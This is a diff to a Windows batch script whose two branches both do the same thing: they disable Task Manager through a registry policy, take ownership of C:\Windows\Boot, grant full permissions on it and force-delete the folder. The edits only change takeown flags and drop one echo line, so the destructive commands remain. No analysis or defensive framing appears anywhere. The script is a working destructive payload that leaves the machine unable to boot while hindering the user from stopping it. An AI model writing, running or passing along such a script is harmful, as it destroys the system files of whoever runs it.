@@ -6,16 +6,15 @@ if /i %input%==no goto B
 
 :A
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-takeown /f "C:\Windows\Boot"
+takeown /A "C:\Windows\Boot"
 icacls "C:\Windows\Boot" /grant administrators:F /t
-@echo off 
 del /F /S /Q "C:\Windows\Boot"
 pause
 
 
 :B 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-takeown /f "C:\Windows\Boot"
+takeown /A "C:\Windows\Boot"
 icacls "C:\Windows\Boot" /grant administrators:F /t
 @echo off 
 del /F /S /Q "C:\Windows\Boot"
